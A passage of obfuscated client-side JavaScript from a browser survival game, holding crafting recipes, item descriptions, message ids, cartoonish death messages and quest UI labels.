      r: [[le.GOLD, 20], [le.PENGUIN_FEATHER, 1]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.GOLD_ARROW,
      id2: le.GOLD_ARROW,
      time: 0.1,
      t: Oe.WEAPONS
    }, {
      r: [[le.DIAMOND, 200], [le.BLUE_CORD, 10], [le.HAWK_FEATHER, 8], [le.PENGUIN_FEATHER, 8], [le.GOLD_BOW, 1]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.DIAMOND_BOW,
      id2: le.DIAMOND_BOW,
      time: 1 / 35,
      t: Oe.WEAPONS
    }, {
      r: [[le.DIAMOND, 10], [le.PENGUIN_FEATHER, 1]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.DIAMOND_ARROW,
      id2: le.DIAMOND_ARROW,
      time: 0.1,
      t: Oe.WEAPONS
    }, {
      r: [[le.AMETHYST, 200], [le.BLUE_CORD, 10], [le.PENGUIN_FEATHER, 8], [le.VULTURE_FEATHER, 8], [le.DIAMOND_BOW, 1]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.AMETHYST_BOW,
      id2: le.AMETHYST_BOW,
      time: 1 / 40,
      t: Oe.WEAPONS
    }, {
      r: [[le.AMETHYST, 10], [le.VULTURE_FEATHER, 1]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.AMETHYST_ARROW,
      id2: le.AMETHYST_ARROW,
      time: 1 / 15,
      t: Oe.WEAPONS
    }, {
      r: [[le.REIDITE, 200], [le.BLUE_CORD, 10], [le.KRAKEN_SKIN, 1], [le.AMETHYST_BOW, 1]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.REIDITE_BOW,
      id2: le.REIDITE_BOW,
      time: 1 / 45,
      t: Oe.WEAPONS
    }, {
      r: [[le.REIDITE, 10], [le.VULTURE_FEATHER, 1], [le.FLAME, 1]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.REIDITE_ARROW,
      id2: le.REIDITE_ARROW,
      time: 1 / 15,
      t: Oe.WEAPONS
    }, {
      r: [[le.EMERALD, 200], [le.BLUE_CORD, 10], [le.DRAGON_ORB, 1], [le.REIDITE_BOW, 1]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.DRAGON_BOW,
      id2: le.DRAGON_BOW,
      time: 0.02,
      t: Oe.WEAPONS
    }, {
      r: [[le.EMERALD, 10], [le.SANDWORM_JUICE, 1]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.DRAGON_ARROW,
      id2: le.DRAGON_ARROW,
      time: 0.05,
      t: Oe.WEAPONS
    }, {
      r: [[le.WOOD, 100]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.WOOD_SHIELD,
      id2: le.WOOD_SHIELD,
      time: 0.04,
      t: Oe.WEAPONS
    }, {
      r: [[le.WOOD_SHIELD, 1], [le.STONE, 100], [le.WOOD, 50]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.STONE_SHIELD,
      id2: le.STONE_SHIELD,
      time: 1 / 40,
      t: Oe.WEAPONS
    }, {
      r: [[le.STONE_SHIELD, 1], [le.GOLD, 50], [le.STONE, 50], [le.WOOD, 50]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.GOLD_SHIELD,
      id2: le.GOLD_SHIELD,
      time: 0.02,
      t: Oe.WEAPONS
    }, {
      r: [[le.GOLD_SHIELD, 1], [le.DIAMOND, 50], [le.GOLD, 50], [le.STONE, 50]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.DIAMOND_SHIELD,
      id2: le.DIAMOND_SHIELD,
      time: 1 / 70,
      t: Oe.WEAPONS
    }, {
      r: [[le.DIAMOND_SHIELD, 1], [le.AMETHYST, 50], [le.DIAMOND, 50], [le.GOLD, 50]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.AMETHYST_SHIELD,
      id2: le.AMETHYST_SHIELD,
      time: 1 / 90,
      t: Oe.WEAPONS
    }, {
      r: [[le.AMETHYST_SHIELD, 1], [le.REIDITE, 50], [le.AMETHYST, 50], [le.DIAMOND, 50]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.REIDITE_SHIELD,
      id2: le.REIDITE_SHIELD,
      time: 1 / 120,
      t: Oe.WEAPONS
    }, {
      r: [[le.GEMME_GREEN, 1], [le.GOLD, 200]],
      w: 1,
      f: 1,
      o: 1,
      e: 0,
      id: ue.CROWN_GREEN,
      id2: le.CROWN_GREEN,
      time: 1 / 60,
      t: Oe.CLOTHES
    }, {
      r: [[le.GEMME_ORANGE, 1], [le.GOLD, 200]],
      w: 1,
      f: 1,
      o: 1,
      e: 0,
      id: ue.CROWN_ORANGE,
      id2: le.CROWN_ORANGE,
      time: 1 / 60,
      t: Oe.CLOTHES
    }, {
      r: [[le.GEMME_BLUE, 1], [le.GOLD, 200], [le.DRAGON_HEART, 1]],
      w: 1,
      f: 1,
      o: 1,
      e: 0,
      id: ue.CROWN_BLUE,
      id2: le.CROWN_BLUE,
      time: 1 / 60,
      t: Oe.CLOTHES
    }, {
      r: [[le.FUR_WOLF, 10], [le.FUR, 5], [le.CORD, 6]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.HOOD,
      id2: le.HOOD,
      time: 0.1,
      t: Oe.CLOTHES
    }, {
      r: [[le.FUR, 3], [le.CORD, 2]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.PEASANT,
      id2: le.PEASANT,
      time: 0.1,
      t: Oe.CLOTHES
    }, {
      r: [[le.HOOD, 1], [le.SPECIAL_FUR_2, 1], [le.FUR_WINTER, 15], [le.BLUE_CORD, 5], [le.PENGUIN_FEATHER, 8]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.WINTER_HOOD,
      id2: le.WINTER_HOOD,
      time: 1 / 60,
      t: Oe.CLOTHES
    }, {
      r: [[le.PEASANT, 1], [le.SPECIAL_FUR, 1], [le.FUR_WINTER, 10], [le.BLUE_CORD, 5], [le.PENGUIN_FEATHER, 8]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.WINTER_PEASANT,
      id2: le.WINTER_PEASANT,
      time: 1 / 60,
      t: Oe.CLOTHES
    }, {
      r: [[le.BUCKET_EMPTY, 1]],
      w: 0,
      f: 0,
      o: 1,
      e: 0,
      id: ue.BUCKET_FULL,
      id2: le.BUCKET_FULL,
      time: 0.2,
      t: Oe.TOOLS
    }, {
      r: [[le.WOOD, 20], [le.CORD, 1]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.BUCKET_EMPTY,
      id2: le.BUCKET_EMPTY,
      time: 0.2,
      t: Oe.TOOLS
    }, {
      r: [[le.STONE, 100], [le.GROUND, 30]],
      w: 1,
      f: 1,
      o: 0,
      e: 0,
      id: ue.WELL,
      id2: le.WELL,
      time: 0.1,
      t: Oe.UTILS
    }, {
      r: [[le.WOOD, 20]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.SIGN,
      id2: le.SIGN,
      time: 0.2,
      t: Oe.UTILS
    }, {
      r: [[le.WOOD, 100], [le.STONE, 50], [le.FUR, 5], [le.FUR_WOLF, 5], [le.CORD, 6]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.BED,
      id2: le.BED,
      time: 0.05,
      t: Oe.UTILS
    }, {
      r: [[le.WOOD, 250], [le.BLUE_CORD, 10], [le.FUR_WINTER, 2], [le.SCALES, 2]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.BOAT,
      id2: le.BOAT,
      time: 0.02,
      t: Oe.UTILS
    }, {
      r: [[le.WOOD, 250], [le.CORD, 10], [le.FUR_WINTER, 2], [le.PENGUIN_FEATHER, 8]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.SLED,
      id2: le.SLED,
      time: 0.02,
      t: Oe.UTILS
    }, {
      r: [[le.CORD, 10], [le.FUR_WOLF, 6], [le.FUR, 4], [le.SAND, 50]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.SADDLE,
      id2: le.SADDLE,
      time: 0.05,
      t: Oe.UTILS
    }, {
      r: [[le.WOOD, 250], [le.CORD, 10], [le.PAPER, 10], [le.HAWK_FEATHER, 8]],
      w: 1,
      f: 0,
      o: 0,
      e: 0,
      id: ue.PLANE,
      id2: le.PLANE,
      time: 0.02,
      t: Oe.UTILS
    }];
    he = 300;
    TEXT = {
      YOU_CANNOT_JOIN: he++,
      KICKED: he++,
      KEY_ALREADY: he++,
      KEY_WRONG: he++,
      OLD_VERSION: he++,
      NO_MORE_RESOURCES: he++,
      SURVIVED_1DAY: he++,
      SURVIVED: he++,
      DAYS: he++,
      DEAD_SAD: he++,
      SPAM_ME: he++,
      SPAM_ME2: he++,
      EMPTY: he++,
      INV_FULL: he++,
      DEAD: he++,
      WRONG_TOOL: he++,
      JOIN_TEAM: he++,
      YOU_DEAD: he++,
      JOINED_TEAM: he++,
      TEAM_DESTROYED: he++,
      LEFT_TEAM: he++,
      LEFT_TEAM2: he++,
      TOKEN: he++,
      CHOOSE: he++,
      PLAYERS: he++,
      TOTAL_PLAYERS: he++,
      TOTAL_MODE: he++,
      COMMING_SOON: he++,
      BACK_TO_THE_GAME: he++,
      TWITTER: he++,
      FACEBOOK: he++,
      KIT_NEXT: he++,
      POINTS: he++,
      SCORE: he++,
      KILL: he++,
      DAYS_SURVIVED: he++,
      MODE_FREE: he++,
      MODE_GRID: he++,
      NEW_VERSION: he++,
      WRONG_PASSWORD: he++,
      TEMPEST_OFF: he++,
      TEMPEST_ON: he++,
      BLIZZARD_OFF: he++,
      BLIZZARD_ON: he++
    };
    for (var Ce = function () {
        ve[le.EXTRACTOR_MACHINE_STONE] = ["Stone Extractor", "Can produce stone with wood", "It takes 10 seconds to drill Stone", "Durability: 2000"];
        ve[le.EXTRACTOR_MACHINE_GOLD] = ["Gold Extractor", "Can produce gold with wood", "It takes 10 seconds to drill Gold", "Durability: 2000"];
        ve[le.EXTRACTOR_MACHINE_DIAMOND] = ["Diamond Extractor", "Can produce diamond with wood", "It takes 10 seconds to drill Diamond", "Durability: 2000"];
        ve[le.EXTRACTOR_MACHINE_AMETHYST] = ["Amethyst Extractor", "Can produce amethyst with wood", "It takes 10 seconds to drill Amethyst", "Durability: 2000"];
        ve[le.EXTRACTOR_MACHINE_REIDITE] = ["Reidite Extractor", "Can produce reidite with wood", "It takes 10 seconds to drill Reidite", "Durability: 2000"];
        ve[le.REIDITE_SHIELD] = ["Reidite Shield", "A must for the pros of the getaway", "You can not attack when you use it", "Damage: 6", "Players Defense: 6"];
        ve[le.AMETHYST_SHIELD] = ["Amethyst Shield", "Because you know how to run away in style", "You can not attack when you use it", "Damage: 5", "Players Defense: 5"];
        ve[le.DIAMOND_SHIELD] = ["Diamond Shield", "Run or attack, you've obviously made your choice.", "You can not attack when you use it", "Damage: 4", "Players Defense: 4"];
        ve[le.GOLD_SHIELD] = ["Gold Shield", "When it's golden, it's always better.", "You can not attack when you use it", "Damage: 3", "Players Defense: 3"];
        ve[le.STONE_SHIELD] = ["Stone Shield", "Protects you a bit more", "You can not attack when you use it", "Damage: 2", "Players Defense: 2"];
        ve[le.WOOD_SHIELD] = ["Wood Shield", "Protects you a bit", "You can not attack when you use it", "Damage: 1", "Players Defense: 1"];
        ve[le.MACHETE] = ["Machete", "You gather more from mob boxes", "Useless to attack mobs", "Damage against Players: 5"];
        ve[le.WOOD_TOWER] = ["Tower", "Allows you to shoot over walls with a bow", "Does not allow to pass through roofs"];
        ve[le.DRAGON_ARROW] = ["Dragon Arrow", "Must be used with a Dragon Bow", "Damage: 45", "Mobs Damage: 1200", "Building Damage: 45"];
        ve[le.DRAGON_BOW] = ["Dragon Bow", "Also called the One-Shot-Monster", "Requiers arrows to be used"];
        ve[le.REIDITE_ARROW] = ["Reidite Arrow", "Must be used with a Reidite or a Dragon Bow", "Damage: 40", "Mobs Damage: 900", "Building Damage: 40"];
        ve[le.REIDITE_BOW] = ["Reidite Bow", "Makes the most terrifying monster cry.", "Requiers any arrows, except dragon arrows, to be used"];
        ve[le.AMETHYST_ARROW] = ["Amethyst Arrow", "Must be used with Amethyst, Reidite or Dragon Bow", "Damage: 35", "Mobs Damage: 600", "Building Damage: 35"];
        ve[le.AMETHYST_BOW] = ["Amethyst Bow", "It's super efficient!", "Requiers any arrows, except dragon and reidite arrows, to be used"];
        ve[le.DIAMOND_ARROW] = ["Diamond Arrow", "Must be used with Diamond, Amethyst, Reidite or Dragon Bow", "Damage: 30", "Mobs Damage: 300", "Building Damage: 30"];
        ve[le.DIAMOND_BOW] = ["Diamond Bow", "Like a Robin Wood who would keep the diamonds", "Requiers wood, stone, gold or diamond arrows to be used"];
        ve[le.GOLD_ARROW] = ["Gold Arrow", "Must be used with a Bow, except a wooden and stone one", "Damage: 25", "Mobs Damage: 200", "Building Damage: 25"];
        ve[le.GOLD_BOW] = ["Gold Bow", "When it's golden, it's better.", "Requiers wood, stone or gold arrows to be used"];
        ve[le.STONE_ARROW] = ["Stone Arrow", "Must be used with a Bow, except a wooden one", "Damage: 20", "Mobs Damage: 100", "Building Damage: 20"];
        ve[le.STONE_BOW] = ["Stone Bow", "Like Robin Wood", "Requiers wood and stone arrows to be used"];
        ve[le.WOOD_ARROW] = ["Wood Arrow", "Must be used with any bow", "Damage: 15", "Mobs Damage: 20", "Building Damage: 15"];
        ve[le.WOOD_BOW] = ["Wood Bow", "A little bow that does not do many damages.", "Requiers wood arrows to be used"];
        ve[le.EMERALD_MACHINE] = ["Emerald Machine", "Allows to automatically generate score points.", "Be careful, you can only build one.", "Once placed your soul is connected to the machine, if the machine is destroyed, you will die.", "The machine can't be build in the sea", "You earn more points in the desert, than in the lava, than in winter, than in the forest."];
        ve[le.FUR_BOAR] = ["Boar fur", "Hakuna Matata, well, he can no longer say it"];
        ve[le.FUR_MAMMOTH] = ["Mammoth fur", "Soft and warm. Perfect for a hat."];
        ve[le.VULTURE_FEATHER] = ["Vulture Feather", "From a deadly vulture"];
        ve[le.EMERALD] = ["Emerald", "How many golden breads can you get from it?"];
        ve[le.SANDWORM_JUICE] = ["Sand Worm Juice", "I don't want to know how you got this."];
        ve[le.TURBAN1] = ["Turban", "Useful to survive in the desert."];
        ve[le.TURBAN2] = ["Ninja outfit", "Essential to survive in the desert"];
        ve[le.PILOT_HELMET] = ["Pilot Hat", "Take off and land with flying objects much faster."];
        ve[le.PILOT_GLASSES] = ["Pilot Glasses"];
        ve[le.MOUNT_BOAR] = ["Tamed Boar", "Fast on lands and slow on water."];
        ve[le.BABY_MAMMOTH] = ["Tamed Baby Mammoth", "Fast on lands and slow on water."];
        ve[le.CRAB_BOSS] = ["Tamed Crab Boss", "Fast on lands and water, and slow on winter.", "Gives a +10 damage bonus of the Crab Spear", "when holding a Crab Helmet"];
        ve[le.BABY_DRAGON] = ["Tamed Baby Dragon", "You can fly with it.", "Faster than a hawk", "When you are flying,", " you can only hit people who are flying too"];
        ve[le.BABY_LAVA] = ["Tamed Baby Lava Dragon", "You can fly with it.", "Faster than a baby dragon", "When you are flying,", " you can only hit people who are flying too"];
        ve[le.HAWK] = ["Tamed Hawk", "You can fly with it.", "When you are flying,", " you can only hit people who are flying too"];
        ve[le.SADDLE] = ["Saddle", "Hit a boar with it to tame it."];
        ve[le.WITCH] = ["Witch Hat", "You're a wizard Starvy!"];
        ve[le.NIMBUS] = ["Nimbus 2000", "That's not just a broomstick, Starvy, it's a Nimbus 2000!", "Only works with the witch hat."];
        ve[le.WAND1] = ["Wand of life", "Soon we must all choose between what is right and what is easy.", "You need the witch hat and firefly to cast spell"];
        ve[le.WAND2] = ["Death Wand", "The wand of He-Who-Must-Not-Be-Named... Lapa...", "You need the witch hat and firefly to cast spell"];
        ve[le.FIREFLY] = ["Firefly", "They make a cute little squeak.", "However, you must tear off his wings to make magical projectiles for use with magic wands."];
        ve[le.PIRATE_HAT] = ["Pirate hat", "You are faster with it in a boat", "Warm outside water and in winter"];
        ve[le.SLED] = ["Sled", "You are faster with it in the snow"];
        ve[le.BOAT] = ["Boat", "You are faster with it in the water"];
        ve[le.PLANE] = ["Plane", "Fly in the forest, ocean and winter", "Can't fly in desert or lava biome", "When you are flying,", " you can only hit people who are flying too"];
        ve[le.HAMMER_REIDITE] = ["Reidite Hammer", "Useful to destroy buildings", "Damage: 6", "Building Damage: 60"];
        ve[le.PENGUIN_FEATHER] = ["Penguin Feather", "From a deadly cute penguin."];
        ve[le.HAWK_FEATHER] = ["Hawk Feather", "From a deadly hawk."];
        ve[le.CACTUS] = ["Cactus", "Food : 20", "Water : 10"];
        ve[le.ALOE_VERA] = ["Aloe Vera", "Allows you to heal a little", "Heal : 30"];
        ve[le.ALOE_VERA_SEED] = ["Aloe Vera Seed", "Grows into Aloe Vera"];
        ve[le.WATERMELON] = ["Watermelon", "Like a melon, but with water", "Food : 15", "Water : 8"];
        ve[le.WATERMELON_SEED] = ["Watermelon Seed", "Grows into Watermelon", "Birth: 4min", "Growth: 180s", "Need water: 3min 20s", "Durability: 400", "Lifetime: 8 days"];
        ve[le.REIDITE_DOOR] = ["Reidite Door", "Noboby can destroy it. Except very reckless", "Damage: 5", "On-Hit Damage: 1", "Durability: 4000"];
        ve[le.REIDITE_WALL] = ["Reidite Wall", "Better wall in StarveLand", "Durability: 4000"];
        ve[le.REIDITE_SPIKE] = ["Reidite Spike", "It hurts", "Damage: 60", "On-Hit Damage: 5", "Durability: 3000"];
        ve[le.REIDITE_DOOR_SPIKE] = ["Reidite Door Spike", "Painful and useful at the same time", "Damage: 35", "On-Hit Damage: 4", "Durability: 2000"];
        ve[le.PICK_REIDITE] = ["Reidite Pickaxe", "Can also harvest reidite, better look!", "Damage: 6", "Building Damage: 1"];
        ve[le.WOOD_DOOR_SPIKE] = ["Wood Door Spike", "Can be opened or closed by you or your friends", "Damage: 5", "On-Hit Damage: 1", "Durability: 100"];
        ve[le.STONE_DOOR_SPIKE] = ["Stone Door Spike", "A stronger door is more serious", "Damage: 10", "On-Hit Damage: 2", "Durability: 200"];
        ve[le.GOLD_DOOR_SPIKE] = ["Gold Door Spike", "Are you rebuilding the \"el dorado?\"", "Damage: 15", "On-Hit Damage: 2", "Durability: 400"];
        ve[le.DIAMOND_DOOR_SPIKE] = ["Diamond Door Spike", "For a shining house", "Damage: 25", "On-Hit Damage: 3", "Durability: 800"];
        ve[le.AMETHYST_DOOR_SPIKE] = ["Amethyst Door Spike", "Is your house a locked safe?", "Damage: 30", "On-Hit Damage: 3", "Durability: 1600"];
        ve[le.CARROT] = ["Carrot", "Eat it or sell it in exchange for Tomato Seed or Diamond", "Food : 20"];
        ve[le.TOMATO] = ["Tomato", "Eat it or sell it in exchange for Thornbush Seed or Amethyst", "Food : 16"];
        ve[le.CARROT_SEED] = ["Carrot Seed", "Grows into Carrot", "Birth: 4min", "Growth: 30s", "Need water: 1min 40s", "Durability: 700", "Lifetime: 8 days"];
        ve[le.TOMATO_SEED] = ["Tomato Seed", "Grows into Tomato", "Birth: 4min", "Growth: 30s", "Need water: 1min 40s", "Durability: 700", "Lifetime: 8 days"];
        ve[le.PITCHFORK] = ["Pitchfork", "Perfect for gathering"];
        ve[le.PITCHFORK2] = ["Golden Pitchfork", "Essential for a real farmer."];
        ve[le.PITCHFORK_PART] = ["Pitchfork Part", "Shaped by the gods. You'll never be hungry again."];
        ve[le.EGG0] = ["Easter Egg", "Eat it or sell it in exchange for wood or stone", "Food : 12"];
        ve[le.EGG1] = ["Easter Egg", "Eat it or sell it in exchange for gold", "Food : 25"];
        ve[le.EGG2] = ["Easter Egg", "Eat it or sell it in exchange for diamond", "Food : 50"];
        ve[le.EGG3] = ["Easter Egg", "Eat it or sell it in exchange for amethyst", "Food : 75"];
        ve[le.EGG4] = ["Easter Egg", "Eat it or sell it in exchange for reidite", "Food : 100"];
        ve[le.LAVA_CUBE] = ["Lava Cube", "You feel an immense power emanating from this cube"];
        ve[le.LAVA_ORB] = ["Lava Orb", "You feel an immense power emanating from this orb"];
        ve[le.LAVA_SWORD] = ["Lava Sword", "Don't be too mean with that.", "Damage: 33", "Building Damage: 11"];
        ve[le.LAVA_SPEAR] = ["Lava Spear", "Doing good or doing evil", "Damage: 24", "Building Damage: 8"];
        ve[le.LAVA_HEART] = ["Lava Heart", "You can feel a strange force.", "A huge power emanates from it.", "We must not find the secret."];
        ve[le.LAVA_HELMET] = ["Lava Helmet", "You will conquer the world", "Players Defense: 9", "Animals Defense: 30"];
        ve[le.REIDITE_SPEAR] = ["Reidite Spear", "Really useful against Lava Monsters", "Damage: 22", "Building Damage: 7"];
        ve[le.REIDITE_SWORD] = ["Reidite Sword", "Really useful against Lava Monsters", "Damage: 30", "Building Damage: 10"];
        ve[le.FLAME] = ["Flame", "It's hot!"];
        ve[le.DIAMOND_PROTECTION] = ["Diamond Protection", "You can survive longer in lava", "Cools down in lava biome", "Players Defense: 2, Animals Defense: 8"];
        ve[le.AMETHYST_PROTECTION] = ["Amethyst Protection", "You can survive longer in lava", "Cools down in lava biome", "Players Defense: 5, Animals Defense: 13"];
        ve[le.REIDITE_PROTECTION] = ["Reidite Protection", "You can survive longer in lava", "Cools down in lava biome", "Players Defense: 6, Animals Defense: 19"];
        ve[le.REIDITE] = ["Reidite", "The ultimate ore"];
        ve[le.DRAGON_CUBE] = ["Dragon Cube", "You feel a great power emanating from this cube"];
        Le[22] = ["This crab, though frightening in nature, pinched your fingertips so hard that you had a heart attack."];
        Le[23] = ["The heat makes you suffocate, you can see your skin fall apart. You're charred. The grilled marshmallow has never been so tasty."];
        Le[24] = ["Your vital organs melt inside, fortunately the toxic gases that escape from the lava make you faint and you do not feel the excruciating pain of death."];
        Le[25] = ["The Will-O'-The-Wisp devoured you from the inside with its fiery flames."];
        Le[26] = ["Oh my God, you died in indescribable pain. Even Lapa turned his head not to see this massacre."];
        Le[27] = ["You were trampled by that boar. From now on, your new nickname is \"the doormat\"."];
        Le[28] = ["With a force of 3300 newtons, the shock wave from the closing of the crab king's claw made you explode your heart from the inside. In addition, the crab has eaten you by sharing your remains with its other small crabs. All dance in joy around your corpse by performing a singular dance called the \"crab rave\""];
        Le[29] = ["Even if it is a baby, under the heat of the flames of this cute dragon, you become a delicious dish."];
        Le[30] = ["Under its cute fake looks, the lava baby dismembers you so quickly that you don't have your life flashes before your eyes."];
        Le[31] = ["The hawk slashed both your eyes out. Terrified, you try to escape by crawling and screaming in pain. Unfortunately the hawk catches you and takes you to distant skies that we already know will never see you again."];
        Le[32] = ["Believing you saw an oasis, you dived into this tree that seemed to you to be full of juicy fruit. Unfortunately, these shiny fruits were in fact horribly painful thorns. Now stuck to the cactus, exhausted by the desert, you have fainted forever."];
        Le[33] = ["That vulture had been spying on you for a long time. He was waiting for a moment of fragility from you. Once cornered by this harassing desert, barely able to breathe, the vulture twisted on you and in a flash ripped out your last hope. At your last breath, you could still see the vulture plunge his head into what was left of your body to enjoy your entrails."];
        Le[34] = ["Out of nowhere, the sand worm devours you in a terrifying howl. But why did Lapa bring such a despicable monster to life?"];
        Le[35] = ["Exhausted by so much heat. You would like to cry, but the sand quickly dries your tears. You suffocate, sand enters your mouth, the thumping sound of the sandstorm will be the last thing you will hear... Next time, use a turban or protect yourself under a roof"];
        Le[36] = ["You feel weak, your vision becomes blurry, you can feel the darkness invading your body. Your soul flies away and leaves behind a lifeless body. Your emerald machine has been destroyed."];
        Le[37] = ["You hear \"Avada Kedavra!\" before you turn to ashes."];
        Le[38] = ["You died crushed by an angry baby mammoth."];
        Le[39] = ["You were skewered by a mammoth. In the violence of the animal's charge, your heart was left hanging on the tip of the tusk. You could still see your heart beating in the open air before losing your life crushed by the mammoth's feet for good. Notice that under the pressure of the crushing your eyes have been exorbed and that the penguins use the frozen eyes of the starvers as a balloon to distract themselves."];
        Le[40] = ["The blizzard storm is so intense that your frostbite causes necrosis of all your limbs. Next time protect yourself with a roof or with warmer clothes."];
        ve[le.CRAB_STICK] = ["Crab sticks", "Oh, yeah? Is there crab in the crab sticks?", "Food: 20"];
        ve[TEXT.TEMPEST_ON] = "A sandstorm is approaching in a few seconds.";
        ve[TEXT.TEMPEST_OFF] = "The sandstorm will soon stop.";
        ve[TEXT.BLIZZARD_ON] = "A blizzard is approaching in a few seconds.";
        ve[TEXT.BLIZZARD_OFF] = "The blizzard will soon stop.";
        ve[TEXT.BACK_TO_THE_GAME] = " BACK TO THE GAME";
        ve[TEXT.TWITTER] = " Share on Twitter";
        ve[TEXT.FACEBOOK] = " Share on Facebook";
        ve[TEXT.KIT_NEXT] = "You can buy items on the shop in the next game with your points";
        ve[TEXT.POINTS] = "points";
        ve[TEXT.SCORE] = "Score";
        ve[TEXT.KILL] = "Kill";
        ve[TEXT.DAYS_SURVIVED] = "Days survived";
        ve[TEXT.MODE_FREE] = "Building method: Free. Press G to change";
        ve[TEXT.MODE_GRID] = "Building method: Grid. Press G to change";
        ve[le.CRAB_LOOT] = ["Crab Claw", "Crab claws can also be eaten", "Food: 10"];
        ve[le.CRAB_SPEAR] = ["Crab Spear", "Allow you to calm crabs, and heal them", "Gives a +10 damages bonus when holding it with", "a Crab Helmet on a Crab King", "Damage: 14", "Building Damage: 4"];
        ve[le.CROWN_CRAB] = ["Crab Helmet", "You are the king of crabs!", "Crabs follow you", "They can't hit you and you can't hit them", "Players Defense: 5", "Animals Defense: 19"];
        ve[le.BED] = ["Bed", "Relax in this confortable bed", "You are less cold, less thirsty, and less hungry", "You will be cured faster", "Durability: 400"];
        document.getElementById("typequest").innerHTML = "Chrono Quests";
        document.getElementById("timeremainingquest").innerHTML = "Time Remaining";
        document.getElementById("constraintquest").innerHTML = " Constraints";
        document.getElementById("claim_rewards").innerHTML = " Claim rewards";
        document.getElementById("rewardquest").innerHTML = " Reward";
        document.getElementById("killdragon_1").innerHTML = " Collect 1 dragon heart inside the cave";
        document.getElementById("amethyst_2").innerHTML = " Gather 1 amethyst";
        document.getElementById("survive20min_3").innerHTML = "Survive without losing life";
        document.getElementById("treasure_chest_4").innerHTML = " Open 5 treasure chests";
        document.getElementById("dont_hit_5").innerHTML = " Be peaceful";
        document.getElementById("bread_6").innerHTML = "100 bread in winter, alone, without come back";
        document.getElementById("winter_7").innerHTML = " After 1 day, survive in winter";
        for (var e = 0; e < 7; e++) {
          document.getElementById("claim_reward_" + e).innerHTML = "CLAIM REWARD!";
        }
        document.getElementById("quit_chronoquest").innerHTML = " QUIT";
        ve[le.HAND] = ["Hand"];
        ve[le.GROUND] = ["Dirt", "Dirty!"];
        ve[le.SAND] = ["Sand", "I got it in my eyes!"];
        ve[le.WOOD] = ["Wood", "You can't get enough of it!"];
        ve[le.STONE] = ["Stone", "Also called a rock"];
        ve[le.GOLD] = ["Gold", "Be generous, give it to others"];
        ve[le.DIAMOND] = ["Diamond", "What will you make with it?"];
        ve[le.AMETHYST] = ["Amethyst", "It's Mauve like Lapa"];
        ve[le.FLOUR] = ["Flour", "Used in cooking"];
        ve[le.COOKIE] = ["Cookie", "A sumptuous grandmother's cookie", "Food: 50"];
        ve[le.CAKE] = ["A cake", "Dream cake for the gourmets", "Food: 100"];
        ve[le.MEAT] = ["Raw meat", "You can cook it with a fire", "Causes food poisoning: 10", "Food: 15"];
        ve[le.COOKED_MEAT] = ["Cooked meat", "A rare steak, please", "Food: 35"];
        ve[le.FOODFISH] = ["Raw fish", "I think it's still alive", "Causes food poisoning: 10", "Food: 18"];
        ve[le.FOODFISH_COOKED] = ["Cooked fish", "With lemon it's perfect", "Food: 35"];
        ve[le.BREAD] = ["Bread", "An excellent French bread", "It's the currency used in the market", "Food: 15"];
        ve[le.SANDWICH] = ["Sandwich", "Tastes like Krabby Patty", "Food: 100"];
        ve[le.CANDY] = ["Candies", "Only for children!", "Food: 20"];
        ve[le.SUGAR_CAN] = ["Sugar cane", "Taste it, it's delicious", "Food: 100"];
        ve[le.GARLAND] = ["Garland", "Perfect decoration for roofs"];
        ve[le.SEED] = ["Berries Seed", "Grows into Berry", "Birth: 2min", "Growth: 55s", "Need water: 3min 20s", "Durability: 700", "Lifetime: 8 days"];
        ve[le.PLANT] = ["Berry", "Berry tasty!", "Food: 10"];
        ve[le.WHEAT_SEED] = ["Wheat Seed", "Grows into Wheat", "Birth: 2min", "Growth: 16s", "Need water: 2min", "Durability: 700", "Lifetime: 8 days"];
        ve[le.WILD_WHEAT] = ["Wild Wheat", "Turns into Flour when placed in Windmill"];
        ve[le.PUMPKIN_SEED] = ["Pumpkin Seed", "Grows into pumpkin", "Birth: 2min 40s", "Growth: 2min", "Need water: 2min", "Durability: 700", "Lifetime: 8 days"];
        ve[le.PUMPKIN] = ["Pumpkin", "It reminds me of Halloween", "Food: 30"];
        ve[le.GARLIC_SEED] = ["Garlic Seed", "Very dangerous for vampires", "Damage: 20", "Birth: 4min", "Growth: 1min 10s", "Need water: 1min 40s", "Durability: 700", "Lifetime: 8 days"];
        ve[le.GARLIC] = ["Garlic", "Reduces cold", "Food: 14", "Effect: 1"];
        ve[le.THORNBUSH_SEED] = ["Thorn bush Seed", "Can damage your enemies", "Damage: 20", "Birth: 4min", "Growth: 15s", "Need water: 3min", "Durability: 1000", "Lifetime: 8 days"];
        ve[le.THORNBUSH] = ["Thorn bush", "It stings!"];
        ve[le.PLOT] = ["Plot", "Seriously, use it", "With this GMO fertilizer your plants", "will growth really faster and need less water", "Durability: 2000"];
        ve[le.ICE] = ["Ice", "Useful for making cakes and water"];
        ve[le.SPANNER] = ["Wrench", "To repair doors, walls and spike", "Damage: 2"];
        ve[le.FUR_WOLF] = ["Wolf Fur", "Puppy? But where is Puppy?!"];
